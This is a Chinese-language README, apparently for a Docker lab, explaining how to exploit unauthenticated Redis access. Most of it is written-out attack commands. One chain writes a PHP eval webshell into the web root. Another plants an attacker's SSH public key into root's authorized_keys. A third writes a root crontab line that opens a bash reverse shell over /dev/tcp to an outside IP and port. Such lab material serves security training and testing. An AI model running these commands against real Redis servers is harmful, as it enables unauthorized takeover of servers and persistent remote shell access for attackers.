# Redis未授权访问

## Redis介绍
Redis是一个开源，高级的键值存储和一个适用的解决方案，用于构建高性能，可扩展的Web应用程序。
Redis有三个主要特点，使它优越于其它键值数据存储系统 -
* Redis将其数据库完全保存在内存中，仅使用磁盘进行持久化。
* 与其它键值数据存储相比，Redis有一组相对丰富的数据类型。
* Redis可以将数据复制到任意数量的从机中

切换到Docker目录下

```shell
docker-compose build
docker-compose up -d
```


## 获取webshell
redis获取webshell方式
![](README/0BC0421F-3329-4D6E-BA98-F139D44C1DB1.png)


登录测试
![](README/4CF6741B-AD1F-4E7C-9C7A-07F78D50694C.png)


获取webshell
```
config set dir /www
config set dbfilename trojan.php
set a "<?php eval($_POST[shadow]) ?>"
save
```

![](README/9A606F34-7043-46DD-A03C-E1DA081F40EC.png)
![](README/497D4AD7-8D43-4D3F-9021-3E84B3A65225.png)


![](README/9A69A13B-2CA7-4346-96F6-FA7DE39A23D5.png)

![](README/6B813CCA-8157-4565-8726-7A2B7C29B8E0.png)



## 访问ssh
在本地计算机上创建ssh密钥
```shell
ssh-keygen -t rsa
```

执行密钥生成命令，基本上是一路回车既可以了，但是需要注意的是：执行命令的过程中是会提示呢输入密钥的密码的，不需要密码直接回车就行

在ssh目录下会多出两个文件，id_rsa和id_rsa.pub，其中id_rsa是私钥，id_rsa.pub这个是公钥，然后就是想办法将公钥放在对方服务器的.ssh目录下

```shell
config set dir /root/.ssh
config set dbfilename authorized_keys
set a "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPIDP4MaWprjQiNZ2kcgcno2TcZiIrOjOB9ffzZc2K4+dldqoawVlDW8qDROWkWXqY+bIX6H4kePorGlX6SW8KYgP5KaG2FGIYeHiVqSrfm+VTxzmS1sOW3jkVXUZZBRdkpknY+0Pwy8aEHYXb+0wnRVeLgBZXb s1riu5@zhangjiangdeMBP\n\n"
save
```

![](README/C1744E97-A449-45FF-B0E8-34AC3232CD5D.png)


![](README/98587EEE-F925-4C6A-99F3-97852FCD9A03.png)




## 利用crontab反弹shell

crontab的计划目录在 _var_spool/cron

```shell
config set dir /var/spool/cron
config set dbfilename root
set b "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/172.168.46.145/6080 0>&1\n\n"
save
```

![](README/46DF2B86-CCF2-43F9-981D-5A2562C3F47D.png)


![](README/87AA4074-AD5C-4881-AB71-D4DB97D78DA8.png)





